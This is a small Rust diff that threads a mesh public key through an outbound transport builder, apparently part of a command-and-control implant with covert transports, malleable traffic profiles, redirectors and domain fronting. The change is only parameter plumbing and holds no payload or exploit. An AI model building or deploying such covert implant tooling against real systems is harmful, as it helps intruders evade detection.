@@ -187,6 +187,7 @@ pub async fn build_outbound_transport(
     secret: &str,
     cert_fp: Option<&str>,
     _agent_id: &str,
+    mesh_public_key: Option<[u8; 32]>,
 ) -> Result<Box<dyn Transport + Send>> {
     // Load config once; shared by the covert-transport selection block below
     // and the traffic_profile assignment in the TLS fallback path.
@@ -307,6 +308,7 @@ pub async fn build_outbound_transport(
                             None,     // agent malleable profile — loaded from server at runtime
                             session,
                             agent_id.to_string(),
+                            mesh_public_key,
                             Some(&cfg.malleable_profile),
                             vec![],   // redirectors — populated via server push at runtime
                             None,     // front_domain — populated via server push at runtime
@@ -452,7 +454,14 @@ async fn connect_once(
     mesh_public_key: [u8; 32],
     mesh_private_key: Arc<LockedSecret>,
 ) -> Result<()> {
-    let transport = build_outbound_transport(addr, secret, cert_fp, agent_id).await?;
+    let transport = build_outbound_transport(
+        addr,
+        secret,
+        cert_fp,
+        agent_id,
+        Some(mesh_public_key),
+    )
+    .await?;
     run_with_heartbeat(transport, agent_id, mesh_public_key, mesh_private_key).await
 }
 
@@ -520,6 +529,7 @@ pub async fn run_forever() -> Result<()> {
             &secret,
             cert_fp.as_deref(),
             &agent_id,
+            Some(mesh_public_key),
         )
         .await
         {
